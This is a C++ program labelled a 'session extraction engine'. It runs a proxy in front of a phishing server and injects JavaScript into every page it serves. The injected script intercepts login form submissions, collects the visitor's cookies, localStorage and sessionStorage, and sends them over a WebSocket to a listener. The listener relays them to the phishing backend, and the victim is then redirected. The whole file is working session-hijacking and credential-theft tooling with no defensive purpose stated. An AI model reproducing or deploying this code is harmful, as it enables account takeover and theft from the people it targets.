/* HEADER: SESSION EXTRACTION ENGINE */
#include <iostream>
#include <string>
#include <thread>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <websocketpp/config/asio_no_tls.hpp>
#include <websocketpp/server.hpp>

using ws_server = websocketpp::server<websocketpp::config::asio>;
const int PROXY_PORT = 9001;
const int PHISH_PORT = 8080;
const int WS_PORT = 9002;

const std::string PAYLOAD = R"(
<script>
var d='';
function x(){
d+='C:'+document.cookie+'|L:'+JSON.stringify(localStorage)+'|S:'+JSON.stringify(sessionStorage)+';';
var s=new WebSocket('ws://'+location.hostname+':9002/');
s.onopen=function(){s.send(d);setTimeout(function(){location.href='REDIRECT';},600);};
return false;
}
var f=document.getElementById('loginForm');
if(f){f.addEventListener('submit',function(e){e.preventDefault();x();});}
else{document.addEventListener('click',function(e){if(e.target&&e.target.type=='submit'){e.preventDefault();x();}});}
</script>)";

void ws_listen() {
    ws_server srv;
    srv.init_asio();
    srv.set_message_handler([](websocketpp::connection_hdl, ws_server::message_ptr msg) {
        std::string payload = msg->get_payload();
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PHISH_PORT);
        inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) >= 0) {
            std::string req = "POST /s HTTP/1.1\r\nHost: localhost\r\nContent-Type: text/plain\r\nContent-Length: " + std::to_string(payload.size()) + "\r\n\r\n" + payload;
            send(sock, req.c_str(), req.size(), 0);
            close(sock);
        }
    });
    srv.listen(WS_PORT);
    srv.start_accept();
    srv.run();
}

int main() {
    std::thread(ws_listen).detach();
    int proxy_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(proxy_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PROXY_PORT);
    bind(proxy_fd, (sockaddr*)&addr, sizeof(addr));
    listen(proxy_fd, 5);

    while (true) {
        int client = accept(proxy_fd, nullptr, nullptr);
        char buf[8192] = {0};
        read(client, buf, sizeof(buf) - 1);
        std::string req(buf);
        int backend = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in be{};
        be.sin_family = AF_INET;
        be.sin_port = htons(PHISH_PORT);
        inet_pton(AF_INET, "127.0.0.1", &be.sin_addr);
        connect(backend, (sockaddr*)&be, sizeof(be));
        send(backend, req.c_str(), req.size(), 0);
        memset(buf, 0, sizeof(buf));
        read(backend, buf, sizeof(buf) - 1);
        std::string res(buf);
        size_t split = res.find("\r\n\r\n");
        if (split != std::string::npos) {
            std::string head = res.substr(0, split);
            std::string body = res.substr(split + 4);
            size_t tag = body.find("</body>");
            if (tag != std::string::npos) body.insert(tag, PAYLOAD);
            std::string final = head + "\r\n\r\n" + body;
            send(client, final.c_str(), final.size(), 0);
        } else send(client, res.c_str(), res.size(), 0);
        close(backend);
        close(client);
    }
    return 0;
}